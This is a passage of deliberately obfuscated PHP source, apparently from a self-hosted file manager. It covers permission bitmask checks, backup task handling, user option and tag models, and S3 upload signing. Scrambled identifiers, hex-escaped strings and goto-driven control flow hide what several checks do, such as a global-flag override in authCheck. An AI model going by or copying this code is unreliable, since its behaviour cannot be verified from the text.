self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($D”µÛÁÕ[383] => LNG($D”µÛÁÕ[2011]), $D”µÛÁÕ[2006] => $D”µÛÁÕ[2012], $D”µÛÁÕ[2008] => 1, $D”µÛÁÕ[2009] => 1, $D”µÛÁÕ[2010] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($D”µÛÁÕ[383] => LNG($D”µÛÁÕ[2013]), $D”µÛÁÕ[2006] => $D”µÛÁÕ[2014], $D”µÛÁÕ[2008] => 2, $D”µÛÁÕ[2009] => 1, $D”µÛÁÕ[2010] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($D”µÛÁÕ[383] => LNG($D”µÛÁÕ[2015]), $D”µÛÁÕ[2006] => $D”µÛÁÕ[2014], $D”µÛÁÕ[2008] => 3, $D”µÛÁÕ[2009] => 1, $D”µÛÁÕ[2010] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($D”µÛÁÕ[383] => LNG($D”µÛÁÕ[2016]), $D”µÛÁÕ[2006] => $D”µÛÁÕ[2017], $D”µÛÁÕ[2008] => 4, $D”µÛÁÕ[2009] => 1, $D”µÛÁÕ[2010] => self::AUTH_SHOW | self::AUTH_VIEW), array($D”µÛÁÕ[383] => LNG($D”µÛÁÕ[2018]), $D”µÛÁÕ[2006] => $D”µÛÁÕ[2019], $D”µÛÁÕ[2008] => 5, $D”µÛÁÕ[2009] => 1, $D”µÛÁÕ[2010] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($D”µÛÁÕ[383] => LNG($D”µÛÁÕ[2020]), $D”µÛÁÕ[2006] => $D”µÛÁÕ[2021], $D”µÛÁÕ[2008] => 7, $D”µÛÁÕ[2009] => 1, $D”µÛÁÕ[2010] => 0)); return $CÑ°„¬•Œ; } public static function authCheck($AÌ¨¬‰¥¿¼, $fÚˆõŒçĞ) { $AÌ¨¬‰¥¿¼ = intval($AÌ¨¬‰¥¿¼); if ($GLOBALS[$_SERVER[÷ÖêïÔÔÓ][453]]) { return !0; } if ($AÌ¨¬‰¥¿¼ <= 0) { return !1; } if (($AÌ¨¬‰¥¿¼ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AÌ¨¬‰¥¿¼ & $fÚˆõŒçĞ); } public static function authCheckShow($B×â¡ƒá®ë) { return self::authCheck($B×â¡ƒá®ë, self::AUTH_SHOW); } public static function authCheckView($dœÅÊ£á–ó) { return self::authCheck($dœÅÊ£á–ó, self::AUTH_VIEW); } public static function authCheckDownload($A˜©÷¢¦®Š) { return self::authCheck($A˜©÷¢¦®Š, self::AUTH_DOWNLOAD); } public static function authCheckUpload($BœÚ·‡´…´) { return self::authCheck($BœÚ·‡´…´, self::AUTH_UPLOAD); } public static function authCheckEdit($EÇš‰™ï£—) { return self::authCheck($EÇš‰™ï£—, self::AUTH_EDIT); } public static function authCheckRemove($f™Éì¼ø†¬) { return self::authCheck($f™Éì¼ø†¬, self::AUTH_REMOVE); } public static function authCheckShare($F‹§×ŠÙŸÇ) { return self::authCheck($F‹§×ŠÙŸÇ, self::AUTH_SHARE); } public static function authCheckComment($D‡–«•šº‘) { return self::authCheck($D‡–«•šº‘, self::AUTH_COMMENT); } public static function authCheckEvent($C‘Â¾£®‘õ) { return self::authCheck($C‘Â¾£®‘õ, self::AUTH_EVENT); } public static function authCheckRoot($aäöå‡ŸÒÍ) { return self::authCheck($aäöå‡ŸÒÍ, self::AUTH_ROOT); } public static function authDisable($aÕáÁ÷‡ä, $aØİïöÔ·) { if (intval($aÕáÁ÷‡ä) <= 0) { return 0; } return intval($aÕáÁ÷‡ä) & ~$aØİïöÔ·; } public $optionType = "\x53\x79\163\164\145\155\56\163\157\x75\x72\143\145\101\x75\x74\x68\114\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\x61\165\164\x68", "\x6c\141\142\145\154", "\144\151\163\160\x6c\141\171", "\x73\171\163\164\145\x6d", "\163\x6f\162\x74"); public function initData() { $eÊ…¦Æöù = $this->authDefault(); foreach ($eÊ…¦Æöù as $D˜Ÿ¯Ô‹å­) { $this->add($D˜Ÿ¯Ô‹å­); } } public function listData($a¿ø‡éÉ±ë = false, $DÇñ­Ë‹† = "\x73\157\162\164", $c¹ğ¨°ğÖ‰ = false) { return parent::listData($a¿ø‡éÉ±ë, $DÇñ­Ë‹†, $c¹ğ¨°ğÖ‰); } public function update($AÍËãóÄŸ‰, $Cì§ôô½ø…) { $A»›ÌÁ…„Š =& $_SERVER[÷ÖêïÔÔÓ]; $a©Â¬·ÏŠ = parent::listData($AÍËãóÄŸ‰); $aÆˆöğÆß¨ = $this->findByName($Cì§ôô½ø…[$A»›ÌÁ…„Š[28]]); if (!$a©Â¬·ÏŠ || $aÆˆöğÆß¨ && $aÆˆöğÆß¨[$A»›ÌÁ…„Š[364]] != $a©Â¬·ÏŠ[$A»›ÌÁ…„Š[364]]) { return !1; } $this->filterAuth($Cì§ôô½ø…[$A»›ÌÁ…„Š[373]]); return parent::update($AÍËãóÄŸ‰, $Cì§ôô½ø…); } public function remove($b‹ˆğæªµó) { $FÑµ°¾¾Ÿ‚ = parent::listData($b‹ˆğæªµó); if (!$FÑµ°¾¾Ÿ‚ || $FÑµ°¾¾Ÿ‚[$_SERVER[÷ÖêïÔÔÓ][1049]]) { return !1; } return parent::remove($b‹ˆğæªµó); } public function add($e­ÍË“‹æ± = array()) { goto E³„Ù¸«Ãè; Açª–¸ÃŒ—: return parent::insert($e­ÍË“‹æ±); goto aµ×ØÉ«ÄŠ; E³„Ù¸«Ãè: $Eà†ß¾˜ôò =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->findByName($e­ÍË“‹æ±[$Eà†ß¾˜ôò[28]])) { return !1; } $böí¡÷¨ŞÇ = array($Eà†ß¾˜ôò[28] => $Eà†ß¾˜ôò[33], $Eà†ß¾˜ôò[373] => 1, $Eà†ß¾˜ôò[2022] => $Eà†ß¾˜ôò[2023], $Eà†ß¾˜ôò[2024] => 1, $Eà†ß¾˜ôò[1049] => 0, $Eà†ß¾˜ôò[2025] => 0); goto BŠèºô‰¬È; BŠèºô‰¬È: $e­ÍË“‹æ± = array_merge($böí¡÷¨ŞÇ, $e­ÍË“‹æ±); $e­ÍË“‹æ±[$Eà†ß¾˜ôò[2025]] = $this->getSort(); $this->filterAuth($e­ÍË“‹æ±[$Eà†ß¾˜ôò[373]]); goto Açª–¸ÃŒ—; aµ×ØÉ«ÄŠ: } private function getSort() { $B™ó«ÎÅ×‹ =& $_SERVER[÷ÖêïÔÔÓ]; $dÒ‘ÎÆ‡ = parent::listData(); $EÈ®à¸İÒæ = array_to_keyvalue($dÒ‘ÎÆ‡, $B™ó«ÎÅ×‹[33], $B™ó«ÎÅ×‹[2025]); return empty($EÈ®à¸İÒæ) ? 0 : max($EÈ®à¸İÒæ) + 1; } private function filterAuth(&$E²ÊğŸËªÎ) { goto F›¥’ùºÙ‘; EØãÒ‹›®¯: foreach ($D²Ø°øÓŞ£ as $FĞ•Û¤º‹³) { if (isset($Bæöë—¥»[$FĞ•Û¤º‹³])) { $D²Ø°øÓŞ£ = array_merge($D²Ø°øÓŞ£, $Bæöë—¥»[$FĞ•Û¤º‹³]); } } $D²Ø°øÓŞ£[] = self::AUTH_SHOW; $E²ÊğŸËªÎ = array_sum(array_unique($D²Ø°øÓŞ£)); goto EÇ´òŒ¢”ğ; eÆåœ„ºŠ: foreach ($e¢ò«ËìÎ as $FĞ•Û¤º‹³) { if ($E²ÊğŸËªÎ & $FĞ•Û¤º‹³) { $D²Ø°øÓŞ£[] = $FĞ•Û¤º‹³; } } if (in_array(self::AUTH_ROOT, $D²Ø°øÓŞ£)) { $E²ÊğŸËªÎ = array_sum($e¢ò«ËìÎ); return; } $Bæöë—¥» = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto EØãÒ‹›®¯; F›¥’ùºÙ‘: if (!$E²ÊğŸËªÎ) { return; } $e¢ò«ËìÎ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $D²Ø°øÓŞ£ = array(); goto eÆåœ„ºŠ; EÇ´òŒ¢”ğ: } public function sort($AÎ·å¦À—·, $f‡ˆ”‘±âë) { return parent::update($AÎ·å¦À—·, $f‡ˆ”‘±âë); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\142\141\143\153\x75\x70\x4c\x69\x73\164"; public $field = array("\x69\157", "\156\141\155\145", "\163\x74\x61\164\x75\163", "\143\x6f\156\x74\x65\156\x74", "\x72\145\x73\x75\154\x74", "\164\x69\155\145\x46\x72\x6f\x6d", "\164\151\155\x65\x54\x6f"); public function config() { goto EêÓÏñ¾²…; EêÓÏñ¾²…: $AºİÎ«ÊÇ¾ =& $_SERVER[÷ÖêïÔÔÓ]; $a§Â“ë§”â = Model($AºİÎ«ÊÇ¾[1057])->get($AºİÎ«ÊÇ¾[697]); $a§Â“ë§”â = json_decode($a§Â“ë§”â, !0); goto DœŠî“®•ã; bˆË¤ƒì¿: if (isset($EŒÚÆô¢[$AºİÎ«ÊÇ¾[187]])) { $EŒÚÆô¢[$AºİÎ«ÊÇ¾[187]] = json_decode($EŒÚÆô¢[$AºİÎ«ÊÇ¾[187]], !0); } if (isset($a§Â“ë§”â[$AºİÎ«ÊÇ¾[187]])) { $EŒÚÆô¢[$AºİÎ«ÊÇ¾[187]][$AºİÎ«ÊÇ¾[1316]] = $a§Â“ë§”â[$AºİÎ«ÊÇ¾[187]]; unset($a§Â“ë§”â[$AºİÎ«ÊÇ¾[187]]); } return array_merge($EŒÚÆô¢, $a§Â“ë§”â); goto c»¦’‰™»¿; DœŠî“®•ã: $a§Â“ë§”â = is_array($a§Â“ë§”â) ? $a§Â“ë§”â : array(); if (!isset($a§Â“ë§”â[$AºİÎ«ÊÇ¾[678]])) { $a§Â“ë§”â[$AºİÎ«ÊÇ¾[678]] = $AºİÎ«ÊÇ¾[464]; } $EŒÚÆô¢ = array(); goto e«äèâÀÎë; e«äèâÀÎë: Action($AºİÎ«ÊÇ¾[2026])->taskInit(); $fğ…ªî³İÆ = Model($AºİÎ«ÊÇ¾[2027])->listData(); foreach ($fğ…ªî³İÆ as $F‚‰ŠÅ§í¿) { if ($F‚‰ŠÅ§í¿[$AºİÎ«ÊÇ¾[1049]] == $AºİÎ«ÊÇ¾[493] && $F‚‰ŠÅ§í¿[$AºİÎ«ÊÇ¾[1329]] == $AºİÎ«ÊÇ¾[2028]) { $EŒÚÆô¢ = $F‚‰ŠÅ§í¿; break; } } goto bˆË¤ƒì¿; c»¦’‰™»¿: } public function listData($DÙ†µ×š’ = false, $F’Ú¡Ñ‹ì‘ = "\155\x6f\x64\151\x66\x79\x54\x69\155\x65", $D­¨®ÍÊÜ = false) { return parent::listData($DÙ†µ×š’, $F’Ú¡Ñ‹ì‘, !0); } public function lastItem() { $AçòÉŠĞÏÑ = $this->listData(); return !empty($AçòÉŠĞÏÑ[0]) ? $AçòÉŠĞÏÑ[0] : null; } public function kill($B×îöªÎë§) { goto Dµ’«‰¤¿; F„ËÑ¤³: $Få±ÎšÈõ² = $E°ŞÂÇç¦œ[$eñÛå‘“Ú¡[28]]; $FéÛÌáÄÏ• = TEMP_FILES . $eñÛå‘“Ú¡[704] . $Få±ÎšÈõ² . $eñÛå‘“Ú¡[8]; IO::remove($FéÛÌáÄÏ•, !1); goto a·ì„ôà¥¼; BĞ¦âÔ¢ : Task::kill($eñÛå‘“Ú¡[696]); Task::kill($eñÛå‘“Ú¡[726]); Task::kill($eñÛå‘“Ú¡[733]); goto F„ËÑ¤³; Dµ’«‰¤¿: $eñÛå‘“Ú¡ =& $_SERVER[÷ÖêïÔÔÓ]; $E°ŞÂÇç¦œ = $this->listData($B×îöªÎë§); if (!$E°ŞÂÇç¦œ || empty($E°ŞÂÇç¦œ[$eñÛå‘“Ú¡[28]])) { return !0; } goto BĞ¦âÔ¢ ; a·ì„ôà¥¼: return $this->remove($B×îöªÎë§); goto fè¤»¶ğ­; fè¤»¶ğ­: } public function remove($aÅùƒÚ–‹) { $B½—›…‚å = $this->listData($aÅùƒÚ–‹); if (!$B½—›…‚å) { return !0; } return $this->backupRemove($B½—›…‚å); } private function backupRemove($e¸Ü˜ÖÑÄ) { $aó¢ø»‹“„ =& $_SERVER[÷ÖêïÔÔÓ]; parent::remove($e¸Ü˜ÖÑÄ[$aó¢ø»‹“„[364]]); $F»½¤Ú = "\x7b\151\x6f\x3a{$e¸Ü˜ÖÑÄ[$aó¢ø»‹“„[677]]}\x7d\57\x64\x61\164\x61\142\141\x73\145\x2f" . $e¸Ü˜ÖÑÄ[$aó¢ø»‹“„[28]]; IO::remove($F»½¤Ú, !1); return !0; } public function start() { goto dŠİ˜ïÁ…ù; D·ÂÅ„³¥ø: if (!$Fù×´‰…°ñ->dbFile()) { return !1; } if ($BË…„‹•ï˜[$c§âªøñ­’[678]] == $c§âªøñ­’[464]) { $Fù×´‰…°ñ->file(); } Backup::set(array($c§âªøñ­’[675] => 1, $c§âªøñ­’[689] => time())); goto AÃ¶Öæ¯¤‚; dŠİ˜ïÁ…ù: $c§âªøñ­’ =& $_SERVER[÷ÖêïÔÔÓ]; $BË…„‹•ï˜ = $this->config(); if (!$BË…„‹•ï˜ || $BË…„‹•ï˜[$c§âªøñ­’[1314]] != $c§âªøñ­’[493]) { return !1; } goto a¢Ô»á¬‡„; AÃ¶Öæ¯¤‚: return !0; goto AÒß¸Òó‹Ë; Dêšèç‘›ˆ: $Fù×´‰…°ñ = new Backup(); $Fù×´‰…°ñ->keep(); if (!$Fù×´‰…°ñ->db()) { return !1; } goto D·ÂÅ„³¥ø; a¢Ô»á¬‡„: if (Hook::trigger($c§âªøñ­’[2029]) == $c§âªøñ­’[2030]) { return !0; } $e¹¡ï®½Ş = $this->process(); foreach ($e¹¡ï®½Ş as $F‡¬á±ˆ¨˜) { if ($F‡¬á±ˆ¨˜) { return Task::restart($F‡¬á±ˆ¨˜[$c§âªøñ­’[364]]); } } goto Dêšèç‘›ˆ; AÒß¸Òó‹Ë: } public function process() { $FÄˆèšÁôÓ =& $_SERVER[÷ÖêïÔÔÓ]; return array($FÄˆèšÁôÓ[680] => Task::get($FÄˆèšÁôÓ[696]), $FÄˆèšÁôÓ[683] => Task::get($FÄˆèšÁôÓ[726]), $FÄˆèšÁôÓ[164] => Task::get($FÄˆèšÁôÓ[733])); } public function restore() { $CÈ·ª Ï÷ =& $_SERVER[÷ÖêïÔÔÓ]; ActionCall($CÈ·ª Ï÷[2031], !0, 1); ActionCall($CÈ·ª Ï÷[2031], !0, 0); } } goto DËòÌÜ‡¡; BƒÍ•¹Œî: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\x5f\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($d¼ï¥‹Û÷à) { return "\x55\163\145\162\117\160\164\x69\x6f\x6e\x5f{$d¼ï¥‹Û÷à}\137" . USER_ID; } protected function filterWhere($aÚ¿ŒÓÏğÇ) { $aÚ¿ŒÓÏğÇ[$_SERVER[÷ÖêïÔÔÓ][1341]] = USER_ID; return $aÚ¿ŒÓÏğÇ; } public function cacheRemoveUser($A¼¾³Ü®ƒ¬, $c»ŠŞ¡Ä) { return Cache::remove("\125\163\x65\162\x4f\160\x74\x69\x6f\x6e\137{$A¼¾³Ü®ƒ¬}\x5f" . $c»ŠŞ¡Ä); } public function get($eÒßŒÒ•Á = false, $f¹§¸ÁÙÜ‡ = '', $B«¿¨ÍÕ¡ö = false) { goto B…ŠÌ»åâÃ; Câ»„ó’©ˆ: global $config; $Bò¨­Ä’›« = array($Dï¤Á½­ğ[33] => $Dï¤Á½­ğ[2413], $Dï¤Á½­ğ[2414] => $Dï¤Á½­ğ[2415]); $cöÇê¹µëà = $config[$Bò¨­Ä’›«[$f¹§¸ÁÙÜ‡]]; goto fçø±Ç‘„; fçø±Ç‘„: if (!$eÒßŒÒ•Á) { return $cöÇê¹µëà; } else { return $cöÇê¹µëà[$eÒßŒÒ•Á]; } goto aÃÕÓ”‰Ñª; B…ŠÌ»åâÃ: $Dï¤Á½­ğ =& $_SERVER[÷ÖêïÔÔÓ]; $B¨†¬ƒ” = parent::get($eÒßŒÒ•Á, $f¹§¸ÁÙÜ‡, $B«¿¨ÍÕ¡ö); if (!is_null($B¨†¬ƒ”)) { return $B¨†¬ƒ”; } goto Câ»„ó’©ˆ; aÃÕÓ”‰Ñª: } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\164\x61\x67\x4c\x69\163\164"; public $modelType = "\125\163\x65\x72\x4f\x70\164\x69\x6f\x6e"; public $field = array("\156\x61\155\145", "\x73\x74\x79\154\x65", "\163\x6f\x72\x74"); public function listData($b•âí²ç×õ = false, $C¤Øª…ßĞó = "\163\157\x72\164", $d… ÁøÌ = false) { return parent::listData($b•âí²ç×õ, $C¤Øª…ßĞó, $d… ÁøÌ); } public function remove($cËòåŠ’Æ‡) { return parent::remove($cËòåŠ’Æ‡); } public function add($d˜Ş’ªÈò¿, $eİ‚ß¦è×ƒ = "\154\141\142\145\154\55\x67\x72\x65\171\55\x6e\x6f\162\x6d\x61\x6c") { $a›£¢Æ×– =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->findByName($d˜Ş’ªÈò¿)) { return !1; } $f‰±ÁÂ‰‚ = array($a›£¢Æ×–[383] => $d˜Ş’ªÈò¿, $a›£¢Æ×–[433] => $eİ‚ß¦è×ƒ, $a›£¢Æ×–[2008] => $this->getSort($a›£¢Æ×–[243]) + 1); return parent::insert($f‰±ÁÂ‰‚); } public function update($E²ÈàÌ®Ø¿, $bÔÑøß¤ÓØ) { $fÇšÍ‹ß…ƒ =& $_SERVER[÷ÖêïÔÔÓ]; $aêñßÄÌŸ± = $this->listData($E²ÈàÌ®Ø¿); $dì†ëÁÆëÖ = $this->findByName($bÔÑøß¤ÓØ[$fÇšÍ‹ß…ƒ[28]]); if (!$aêñßÄÌŸ± || $dì†ëÁÆëÖ && $dì†ëÁÆëÖ[$fÇšÍ‹ß…ƒ[364]] != $aêñßÄÌŸ±[$fÇšÍ‹ß…ƒ[364]]) { return !1; } return parent::update($E²ÈàÌ®Ø¿, $bÔÑøß¤ÓØ); } public function moveTop($d®§Ôğ) { $B¿‚ÀÙ’ =& $_SERVER[÷ÖêïÔÔÓ]; $dØ¨ì“Š„ = parent::listData(); $F±Áí¢°Â = $this->getSort($B¿‚ÀÙ’[242]); foreach ($dØ¨ì“Š„ as &$FŒ÷Ø¬«®á) { if ($FŒ÷Ø¬«®á[$B¿‚ÀÙ’[364]] == $d®§Ôğ) { $FŒ÷Ø¬«®á[$B¿‚ÀÙ’[2025]] = $F±Áí¢°Â; continue; } $FŒ÷Ø¬«®á[$B¿‚ÀÙ’[2025]] += 1; } return parent::resetData($dØ¨ì“Š„); } public function moveBottom($e½Â¹ÎÏĞ) { $D÷èÇ‡Ò†Ÿ =& $_SERVER[÷ÖêïÔÔÓ]; $BŸ×¹Ùàñš = $this->getSort($D÷èÇ‡Ò†Ÿ[243]) + 1; return parent::update($e½Â¹ÎÏĞ, array($D÷èÇ‡Ò†Ÿ[2025] => $BŸ×¹Ùàñš)); } public function resetSort($A¼ÕƒäÍ§¾) { $AšÇæ´ä‹ =& $_SERVER[÷ÖêïÔÔÓ]; $F¡È†‡İ™ = array(); for ($E¯ÏñÒ÷¼ = 0; $E¯ÏñÒ÷¼ < count($A¼ÕƒäÍ§¾); $E¯ÏñÒ÷¼++) { $F¡È†‡İ™[$A¼ÕƒäÍ§¾[$E¯ÏñÒ÷¼] . $AšÇæ´ä‹[33]] = $E¯ÏñÒ÷¼ + 1; } $BÀÊõÀªÌ» = parent::listData(); foreach ($BÀÊõÀªÌ» as &$FÜ¬Äİù¸™) { $câ¯ÚˆÕ°ö = $F¡È†‡İ™[$FÜ¬Äİù¸™[$AšÇæ´ä‹[364]]]; $FÜ¬Äİù¸™[$AšÇæ´ä‹[2025]] = $câ¯ÚˆÕ°ö ? $câ¯ÚˆÕ°ö : $FÜ¬Äİù¸™[$AšÇæ´ä‹[2025]]; } return parent::resetData($BÀÊõÀªÌ»); } private function getSort($e¸ÆŠ¡‹¯›) { $c™ßóìŸ¢ =& $_SERVER[÷ÖêïÔÔÓ]; $Bâ¡‹ê‰÷ò = parent::listData(); $Eä×‚‰‘‰ = array_to_keyvalue($Bâ¡‹ê‰÷ò, $c™ßóìŸ¢[33], $c™ßóìŸ¢[2025]); if (!$Eä×‚‰‘‰) { $Eä×‚‰‘‰ = array(0); } $a‘„™£Ò½ = $e¸ÆŠ¡‹¯› == $c™ßóìŸ¢[243] ? max($Eä×‚‰‘‰) : min($Eä×‚‰‘‰); return intval($a‘„™£Ò½); } } goto aÜ©Ö“ì; fç¼İ¶ŒÔ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($cğª ÄŠ–) { parent::__construct($cğª ÄŠ–); } public function uploadFormData($fŠ®ïßì‰¼, $EÔÆ®ÚƒòÄ = 3600) { goto fÒ‰Ü‹îÌÁ; E¬‹ëÕ†‚: $Eô°šß¹œ¶ = hash_hmac($d½ğöÛĞÕ¸[1102], $B„ŒÅÁ¡„ë, $BŠöÅêóáø, !0); $dˆñÁ”øß = hash_hmac($d½ğöÛĞÕ¸[1102], $DÖË‚òˆ, $Eô°šß¹œ¶, !0); $B‚æØíæ²Û = hash_hmac($d½ğöÛĞÕ¸[1102], $EËÌ¥ƒÍíÖ, $dˆñÁ”øß); goto bêÙÊÕ£é; fÒ‰Ü‹îÌÁ: $d½ğöÛĞÕ¸ =& $_SERVER[÷ÖêïÔÔÓ]; $dñ­ëšŠî = $d½ğöÛĞÕ¸[182]; $EÁ£¬Ö¯Õ™ = $d½ğöÛĞÕ¸[1092]; goto F“¿èöŸöÒ; bêÙÊÕ£é: $D…×–Üµ£š = array($d½ğöÛĞÕ¸[196] => $d½ğöÛĞÕ¸[33], $d½ğöÛĞÕ¸[1104] => $d½ğöÛĞÕ¸[33], $d½ğöÛĞÕ¸[1066] => $dñ­ëšŠî, $d½ğöÛĞÕ¸[1070] => $CİŞÜˆëöŒ, $d½ğöÛĞÕ¸[1074] => $EËÌ¥ƒÍíÖ, $d½ğöÛĞÕ¸[1105] => $açâêêàµì, $d½ğöÛĞÕ¸[1106] => $EÁ£¬Ö¯Õ™, $d½ğöÛĞÕ¸[1107] => $Dˆİ•ÈòÅ, $d½ğöÛĞÕ¸[1108] => $fÚíÑ²½††, $d½ğöÛĞÕ¸[1109] => $B‚æØíæ²Û, $d½ğöÛĞÕ¸[166] => $this->getHost()); return $D…×–Üµ£š; goto dµ÷‹êÏ; E‡‚µïÈ‹: $EËÌ¥ƒÍíÖ = base64_encode(json_encode($bÇ×µËµ”Ë)); $b¾¤’ºÀÅù = hash_hmac($d½ğöÛĞÕ¸[1102], $a¹†·±¢, $d½ğöÛĞÕ¸[1103] . $this->secret, !0); $BŠöÅêóáø = hash_hmac($d½ğöÛĞÕ¸[1102], $this->region, $b¾¤’ºÀÅù, !0); goto E¬‹ëÕ†‚; Bê˜­»ªÉ: $DÖË‚òˆ = $d½ğöÛĞÕ¸[1094]; $fÚíÑ²½†† = $EÔÆ®ÚƒòÄ . $d½ğöÛĞÕ¸[33]; $CİŞÜˆëöŒ = $d½ğöÛĞÕ¸[1062]; goto Dâ‘ßèğ½¹; F“¿èöŸöÒ: $B„ŒÅÁ¡„ë = $d½ğöÛĞÕ¸[59]; $Dˆİ•ÈòÅ = gmdate($d½ğöÛĞÕ¸[1093]); $a¹†·±¢ = gmdate($d½ğöÛĞÕ¸[676]); goto Bê˜­»ªÉ; Dâ‘ßèğ½¹: $bÒ¯İá¸ğØ = array($this->accessKey, $a¹†·±¢, $this->region, $B„ŒÅÁ¡„ë, $DÖË‚òˆ); $açâêêàµì = implode($d½ğöÛĞÕ¸[8], $bÒ¯İá¸ğØ); $bÇ×µËµ”Ë = array($d½ğöÛĞÕ¸[1064] => gmdate($d½ğöÛĞÕ¸[1063], strtotime($d½ğöÛĞÕ¸[1095])), $d½ğöÛĞÕ¸[1065] => array(array($d½ğöÛĞÕ¸[1067] => $this->bucket), array($d½ğöÛĞÕ¸[1066] => $dñ­ëšŠî), array($d½ğöÛĞÕ¸[1068], $d½ğöÛĞÕ¸[1069], $d½ğöÛĞÕ¸[33]), array($d½ğöÛĞÕ¸[1068], $d½ğöÛĞÕ¸[1096], $d½ğöÛĞÕ¸[33]), array($d½ğöÛĞÕ¸[1068], $d½ğöÛĞÕ¸[1097], $d½ğöÛĞÕ¸[33]), array($d½ğöÛĞÕ¸[1070] => $CİŞÜˆëöŒ), array($d½ğöÛĞÕ¸[1098] => $açâêêàµì), array($d½ğöÛĞÕ¸[1099] => $EÁ£¬Ö¯Õ™), array($d½ğöÛĞÕ¸[1100] => $Dˆİ•ÈòÅ), array($d½ğöÛĞÕ¸[1101] => $fÚíÑ²½††))); goto E‡‚µïÈ‹; dµ÷‹êÏ: } public function multiUploadFormData($c½…¢êæšƒ, $c‰ˆâĞÍ¡Ì = 3600) { $dàĞ¬¸èèÈ =& $_SERVER[÷ÖêïÔÔÓ]; $fñŠÇÅ»÷ = gmdate($dàĞ¬¸èèÈ[1189]); $C³ŞšÍ‰ÄŞ = array(); $A†î«–Ú¿ = $this->client->getUploadId($this->bucket, $c½…¢êæšƒ, $C³ŞšÍ‰ÄŞ); if (!$A†î«–Ú¿) { return !1; } return array($dàĞ¬¸èèÈ[206] => $A†î«–Ú¿, $dàĞ¬¸èèÈ[166] => $this->getHost() . $dàĞ¬¸èèÈ[8] . $this->pathEncode($c½…¢êæšƒ), $dàĞ¬¸èèÈ[207] => $fñŠÇÅ»÷, $dàĞ¬¸èèÈ[88] => $c½…¢êæšƒ); } public function multiUploadAuthData($AÍ¢£©à˜, $f£ÈÇÄ•œÔ = array()) { goto Cå¡÷ÆõÚ‰; b‹ö ßàĞ: $bğø ß®º = $bìš‡¤æÚã[211]; $e±×† õ’‡ = $bìš‡¤æÚã[8] . $this->pathEncode($AË¯Ğ¤´µ¸) . $A‹‚ôî„»¢; $A–Û÷Çèæï = $this->client->__getSignatureV4($F£³…‚”ç, $c“‰¾È›Ğ, $bğø ß®º, $e±×† õ’‡); goto F÷ĞĞŒ‹íì; Cå¡÷ÆõÚ‰: $bìš‡¤æÚã =& $_SERVER[÷ÖêïÔÔÓ]; $A‹‚ôî„»¢ = isset($f£ÈÇÄ•œÔ[$bìš‡¤æÚã[157]]) ? $f£ÈÇÄ•œÔ[$bìš‡¤æÚã[157]] : $bìš‡¤æÚã[33]; $AË¯Ğ¤´µ¸ = $f£ÈÇÄ•œÔ[$bìš‡¤æÚã[88]]; goto b¢¥‰Ö„¯­; b¢¥‰Ö„¯­: unset($f£ÈÇÄ•œÔ[$bìš‡¤æÚã[88]]); if (isset($f£ÈÇÄ•œÔ[$bìš‡¤æÚã[208]])) { return $this->listUploadParts($AË¯Ğ¤´µ¸, $f£ÈÇÄ•œÔ); } $F£³…‚”ç = array(); goto d™×æ×›¬ï; F÷ĞĞŒ‹íì: if (strpos($A‹‚ôî„»¢, $bìš‡¤æÚã[210]) === 0) { if (isset($F£³…‚”ç[$bìš‡¤æÚã[1191]])) { $DİÌ¦ÓÏº = $F£³…‚”ç[$bìš‡¤æÚã[1191]]; } else { if (isset($A–Û÷Çèæï[$bìš‡¤æÚã[1191]])) { $DİÌ¦ÓÏº = $A–Û÷Çèæï[$bìš‡¤æÚã[1191]]; } else { $DİÌ¦ÓÏº = hash($bìš‡¤æÚã[1102], $bìš‡¤æÚã[33]); } } return array($bìš‡¤æÚã[217] => $A–Û÷Çèæï[$bìš‡¤æÚã[217]], $bìš‡¤æÚã[1191] => $DİÌ¦ÓÏº, $bìš‡¤æÚã[207] => $A–Û÷Çèæï[$bìš‡¤æÚã[1194]]); } return $A–Û÷Çèæï[$bìš‡¤æÚã[217]]; goto E–›äï†Á·; d™×æ×›¬ï: if (isset($f£ÈÇÄ•œÔ[$bìš‡¤æÚã[1190]])) { $F£³…‚”ç[$bìš‡¤æÚã[1191]] = $f£ÈÇÄ•œÔ[$bìš‡¤æÚã[1190]]; } $cìÖˆÄÛ¥¤ = explode($bìš‡¤æÚã[168], $this->getHost()); $c“‰¾È›Ğ = array($bìš‡¤æÚã[1192] => $cìÖˆÄÛ¥¤[1], $bìš‡¤æÚã[1193] => $bìš‡¤æÚã[33], $bìš‡¤æÚã[196] => $bìš‡¤æÚã[115], $bìš‡¤æÚã[1104] => $f£ÈÇÄ•œÔ[$bìš‡¤æÚã[78]]); goto b‹ö ßàĞ; E–›äï†Á·: } public function listUploadParts($f„©–Äš˜, $BÍÀÜÎ‰Ê¶ = array()) { goto eé®–œ¦¤•; eé®–œ¦¤•: $aàÔöÒ©Ïø =& $_SERVER[÷ÖêïÔÔÓ]; $E…æÜçæ = 